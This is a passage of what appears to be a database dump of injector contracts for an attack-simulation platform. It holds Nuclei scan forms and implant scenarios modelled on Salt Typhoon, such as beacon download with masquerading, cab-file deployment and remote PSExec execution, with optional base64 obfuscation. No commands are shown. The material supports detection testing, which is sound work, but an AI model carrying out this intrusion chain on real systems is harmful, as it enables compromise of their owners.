 <br/><br/>\\n    Kind regards,<br />\\n    The animation team\\n","richText":true,"type":"textarea"},{"key":"encrypted","label":"Encrypted","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":false,"type":"checkbox"},{"key":"teams","label":"Teams","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"team"},{"key":"attachments","label":"Attachments","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"attachment"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"f8e70b27-a69c-4b9f-a2df-e217c36b3981","contract_attack_patterns_external_ids":[],"is_atomic_testing":false,"needs_executor":false,"platforms":["Internal"]}	49229430-b5b5-431f-ba5b-f36f599b0233	f	f	{Internal}	f	\N	f	\N
c01fa03a-ea7e-43a3-9b1a-44b2f41a8c5f	2026-01-09 14:19:37.129827+00	2026-01-16 10:18:33.255603+00	"en"=>"Nuclei - Cloud Templates", "fr"=>"Nuclei - Cloud Templates"	f	{"contract_id": "c01fa03a-ea7e-43a3-9b1a-44b2f41a8c5f", "label": {"en": "Nuclei - Cloud Templates", "fr": "Nuclei - Cloud Templates"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
2e7fc079-9ebf-4adf-8d94-79d8f7bb32f4	2026-01-09 14:19:37.132935+00	2026-01-16 10:18:33.25667+00	"en"=>"Nuclei - XSS Scan", "fr"=>"Nuclei - Scan XSS"	f	{"contract_id": "2e7fc079-9ebf-4adf-8d94-79d8f7bb32f4", "label": {"en": "Nuclei - XSS Scan", "fr": "Nuclei - Scan XSS"}, "fields": [{"key": "target_selector", "label": "Type of targets", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": true, "readOnly": false, "cardinality": "1", "defaultValue": ["asset-groups"], "choices": {"assets": "Assets", "manual": "Manual", "asset-groups": "Asset groups"}}, {"key": "assets", "label": "Targeted assets", "type": "asset", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "assets"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "assets"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "asset_groups", "label": "Targeted asset groups", "type": "asset-group", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "asset-groups"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "asset-groups"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": []}, {"key": "target_property_selector", "label": "Targeted assets property", "type": "select", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": ["assets", "asset-groups"]}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": ["assets", "asset-groups"]}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ["automatic"], "choices": {"automatic": "Automatic", "hostname": "Hostname", "seen_ip": "Seen IP", "local_ip": "Local IP (first)"}}, {"key": "targets", "label": "Manual targets (comma-separated)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": ["target_selector"], "mandatoryConditionValues": {"target_selector": "manual"}, "visibleConditionFields": ["target_selector"], "visibleConditionValues": {"target_selector": "manual"}, "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}, {"key": "expectations", "label": "Expectations", "type": "expectation", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "n", "defaultValue": [], "predefinedExpectations": [{"expectation_type": "VULNERABILITY", "expectation_name": "Not vulnerable", "expectation_description": "", "expectation_score": 100, "expectation_expectation_group": false}]}, {"key": "template", "label": "Manual template path (-t)", "type": "text", "mandatoryGroups": [], "mandatoryConditionFields": [], "mandatoryConditionValues": [], "visibleConditionFields": [], "visibleConditionValues": [], "linkedFields": [], "mandatory": false, "readOnly": false, "cardinality": "1", "defaultValue": ""}], "outputs": [{"type": "cve", "field": "cve", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}, {"type": "text", "field": "others", "labels": ["nuclei"], "isFindingCompatible": true, "isMultiple": true}], "config": {"type": "openaev_nuclei", "expose": true, "label": {"en": "Nuclei Scan", "fr": "Nuclei Scan"}, "color_dark": "#ff5722", "color_light": "#ff5722"}, "manual": false, "variables": [{"key": "user", "label": "User that will receive the injection", "type": "String", "cardinality": "1", "children": [{"key": "user.id", "label": "Id of the user in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "user.email", "label": "Email of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.firstname", "label": "Firstname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lastname", "label": "Lastname of the user", "type": "String", "cardinality": "1", "children": []}, {"key": "user.lang", "label": "Lang of the user", "type": "String", "cardinality": "1", "children": []}]}, {"key": "exercise", "label": "Exercise of the current injection", "type": "Object", "cardinality": "1", "children": [{"key": "exercise.id", "label": "Id of the exercise in the platform", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.name", "label": "Name of the exercise", "type": "String", "cardinality": "1", "children": []}, {"key": "exercise.description", "label": "Description of the exercise", "type": "String", "cardinality": "1", "children": []}]}, {"key": "teams", "label": "List of team name for the injection", "type": "String", "cardinality": "n", "children": []}, {"key": "player_uri", "label": "Player interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "challenges_uri", "label": "Challenges interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "scoreboard_uri", "label": "Scoreboard interface platform link", "type": "String", "cardinality": "1", "children": []}, {"key": "lessons_uri", "label": "Lessons learned interface platform link", "type": "String", "cardinality": "1", "children": []}], "contract_attack_patterns_external_ids": [], "contract_vulnerability_external_ids": [], "is_atomic_testing": true, "platforms": [], "external_id": null}	e1bad898-9804-427d-99e4-dc32c5f2898d	t	f	{}	f	\N	f	\N
521be43d-2640-4263-9894-14b53f160732	2026-01-09 14:19:24.978892+00	2026-01-09 14:19:24.979047+00	"en"=>"Download beacon to target with some masquerading - Salt Typhoon Style", "fr"=>"Download beacon to target with some masquerading - Salt Typhoon Style"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Download beacon to target with some masquerading - Salt Typhoon Style","en":"Download beacon to target with some masquerading - Salt Typhoon Style"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"521be43d-2640-4263-9894-14b53f160732","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	f4404a73-23ca-4aee-b993-3fc528a4fc66	f	\N
54c2ee6e-c687-46ea-9abb-fa11f92d76e4	2026-01-09 14:19:25.327808+00	2026-01-09 14:19:25.327834+00	"en"=>"Deploy cab file containing beacon to target - Salt Typhoon Style", "fr"=>"Deploy cab file containing beacon to target - Salt Typhoon Style"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Deploy cab file containing beacon to target - Salt Typhoon Style","en":"Deploy cab file containing beacon to target - Salt Typhoon Style"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"54c2ee6e-c687-46ea-9abb-fa11f92d76e4","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	b46193c6-badf-4c9f-bc65-023f70377add	f	\N
e0680190-88b6-49d8-a9d4-68ba9ee49ee9	2026-01-09 14:19:25.629267+00	2026-01-09 14:19:25.630217+00	"en"=>"Copy beacon cab file to remote target with some masquerading - Salt Typhoon", "fr"=>"Copy beacon cab file to remote target with some masquerading - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Copy beacon cab file to remote target with some masquerading - Salt Typhoon","en":"Copy beacon cab file to remote target with some masquerading - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"},{"key":"HOSTNAME","label":"HOSTNAME","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"127.0.0.1","type":"text"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"e0680190-88b6-49d8-a9d4-68ba9ee49ee9","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	5c576220-990a-4818-814f-89ab68bad7b7	f	\N
ecaeabd1-2b14-4be7-98a1-7c70e3207ba2	2026-01-09 14:19:25.894147+00	2026-01-09 14:19:25.894164+00	"en"=>"Expand cab file to remote target with some masquerading - Salt Typhoon", "fr"=>"Expand cab file to remote target with some masquerading - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Expand cab file to remote target with some masquerading - Salt Typhoon","en":"Expand cab file to remote target with some masquerading - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 obfuscation"}],"type":"choice"},{"key":"expectations","label":"Expectations","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"predefinedExpectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100.0,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"type":"expectation"},{"key":"HOSTNAME","label":"HOSTNAME","mandatory":true,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"defaultValue":"127.0.0.1","type":"text"}],"variables":[{"key":"user","label":"User that will receive the injection","type":"String","cardinality":"1","children":[{"key":"user.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"user.email","label":"Email of the user","type":"String","cardinality":"1","children":[]},{"key":"user.firstname","label":"First name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lastname","label":"Last name of the user","type":"String","cardinality":"1","children":[]},{"key":"user.lang","label":"Language of the user","type":"String","cardinality":"1","children":[]}]},{"key":"exercise","label":"Exercise of the current injection","type":"Object","cardinality":"1","children":[{"key":"exercise.id","label":"Id of the user in the platform","type":"String","cardinality":"1","children":[]},{"key":"exercise.name","label":"Name of the exercise","type":"String","cardinality":"1","children":[]},{"key":"exercise.description","label":"Description of the exercise","type":"String","cardinality":"1","children":[]}]},{"key":"teams","label":"List of team name for the injection","type":"String","cardinality":"n","children":[]},{"key":"player_uri","label":"Player interface platform link","type":"String","cardinality":"1","children":[]},{"key":"challenges_uri","label":"Challenges interface platform link","type":"String","cardinality":"1","children":[]},{"key":"scoreboard_uri","label":"Scoreboard interface platform link","type":"String","cardinality":"1","children":[]},{"key":"lessons_uri","label":"Lessons learned interface platform link","type":"String","cardinality":"1","children":[]}],"context":{},"contract_id":"ecaeabd1-2b14-4be7-98a1-7c70e3207ba2","contract_attack_patterns_external_ids":[],"is_atomic_testing":true,"needs_executor":true,"platforms":["Windows"]}	49229430-b5b5-431f-ba5b-f36f599b0144	t	f	{Windows}	t	42c2f03b-9917-439a-afd4-213e6e736291	f	\N
8551e440-55e5-4122-a1e2-43fd802e7df6	2026-01-09 14:19:26.159087+00	2026-01-09 14:19:26.159109+00	"en"=>"Execute a remote BAT Script via PSExec - Salt Typhoon", "fr"=>"Execute a remote BAT Script via PSExec - Salt Typhoon"	f	{"config":{"type":"openaev_implant","expose":true,"label":{"fr":"OpenAEV Implant","en":"OpenAEV Implant"},"color_dark":"#000000","color_light":"#000000"},"label":{"fr":"Execute a remote BAT Script via PSExec - Salt Typhoon","en":"Execute a remote BAT Script via PSExec - Salt Typhoon"},"manual":false,"fields":[{"key":"assets","label":"Source assets","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset"},{"key":"asset_groups","label":"Source asset groups","mandatory":false,"readOnly":false,"mandatoryGroups":["assets","asset_groups"],"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"n","defaultValue":[],"type":"asset-group"},{"key":"obfuscator","label":"Obfuscators","mandatory":false,"readOnly":false,"mandatoryGroups":null,"mandatoryConditionFields":null,"mandatoryConditionValues":null,"visibleConditionFields":null,"visibleConditionValues":null,"linkedFields":[],"linkedValues":[],"cardinality":"1","defaultValue":["plain-text"],"choices":[{"label":"plain-text","value":"plain-text","information":""},{"label":"base64","value":"base64","information":"CMD does not support base64 